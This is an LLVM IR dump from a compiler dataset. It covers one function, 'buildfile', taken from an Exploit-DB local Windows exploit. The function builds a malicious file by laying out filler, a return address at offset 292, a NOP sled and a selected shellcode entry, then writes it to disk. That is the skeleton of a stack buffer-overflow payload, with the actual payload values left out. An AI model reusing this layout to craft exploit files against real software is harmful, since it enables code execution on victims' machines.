; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_11408.c_buildfile.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86/local/extr_11408.c_buildfile.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32* }

@file = common dso_local global i8* null, align 8
@ret = common dso_local global i32 0, align 4
@NOP = common dso_local global i32* null, align 8
@use = common dso_local global %struct.TYPE_2__* null, align 8
@S = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [26 x i8] c"[#]Your Retcode is: 0x%X\0A\00", align 1
@.str.1 = private unnamed_addr constant [3 x i8] c"wb\00", align 1
@.str.2 = private unnamed_addr constant [22 x i8] c"Error in writing file\00", align 1
@.str.3 = private unnamed_addr constant [21 x i8] c"[!]File is %d bytes\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @buildfile(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [100000 x i8], align 16
  %4 = alloca i32*, align 8
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %6 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %7 = call i32 @gen_random(i8* %6, i32 5000)
  %8 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %9 = load i8*, i8** @file, align 8
  %10 = load i8*, i8** @file, align 8
  %11 = call i32 @strlen(i8* %10)
  %12 = call i32 (i8*, ...) @memcpy(i8* %8, i8* %9, i32 %11)
  %13 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %14 = getelementptr inbounds i8, i8* %13, i64 292
  %15 = call i32 (i8*, ...) @memcpy(i8* %14, i32* @ret, i32 4)
  %16 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %17 = getelementptr inbounds i8, i8* %16, i64 312
  %18 = load i32*, i32** @NOP, align 8
  %19 = call i32 (i8*, ...) @memcpy(i8* %17, i32* %18, i32 10)
  %20 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %21 = getelementptr inbounds i8, i8* %20, i64 322
  %22 = load %struct.TYPE_2__*, %struct.TYPE_2__** @use, align 8
  %23 = load i64, i64* @S, align 8
  %24 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %22, i64 %23
  %25 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %24, i32 0, i32 0
  %26 = load i32*, i32** %25, align 8
  %27 = load %struct.TYPE_2__*, %struct.TYPE_2__** @use, align 8
  %28 = load i64, i64* @S, align 8
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %27, i64 %28
  %30 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %29, i32 0, i32 0
  %31 = load i32*, i32** %30, align 8
  %32 = bitcast i32* %31 to i8*
  %33 = call i32 @strlen(i8* %32)
  %34 = call i32 (i8*, ...) @memcpy(i8* %21, i32* %26, i32 %33)
  %35 = load i32, i32* @ret, align 4
  %36 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i32 %35)
  %37 = load i8*, i8** %2, align 8
  %38 = call i32* @fopen(i8* %37, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  store i32* %38, i32** %4, align 8
  %39 = load i32*, i32** %4, align 8
  %40 = icmp ne i32* %39, null
  br i1 %40, label %41, label %47

41:                                               ; preds = %1
  %42 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %43 = load i32*, i32** %4, align 8
  %44 = call i32 @fwrite(i8* %42, i32 1, i32 1534, i32* %43)
  %45 = load i32*, i32** %4, align 8
  %46 = call i32 @fclose(i32* %45)
  br label %50

47:                                               ; preds = %1
  %48 = call i32 @print(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.2, i64 0, i64 0))
  %49 = call i32 @exit(i32 0) #3
  unreachable

50:                                               ; preds = %41
  %51 = getelementptr inbounds [100000 x i8], [100000 x i8]* %3, i64 0, i64 0
  %52 = call i32 @free(i8* %51)
  %53 = load i8*, i8** @file, align 8
  %54 = call i32 @free(i8* %53)
  %55 = load i32*, i32** %4, align 8
  %56 = load i8*, i8** %2, align 8
  %57 = call i32 @getFsize(i32* %55, i8* %56)
  store i32 %57, i32* %5, align 4
  %58 = load i32, i32* %5, align 4
  %59 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0), i32 %58)
  ret void
}

declare dso_local i32 @gen_random(i8*, i32) #1

declare dso_local i32 @memcpy(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @printf(i8*, i32) #1

declare dso_local i32* @fopen(i8*, i8*) #1

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #1

declare dso_local i32 @fclose(i32*) #1

declare dso_local i32 @print(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @free(i8*) #1

declare dso_local i32 @getFsize(i32*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
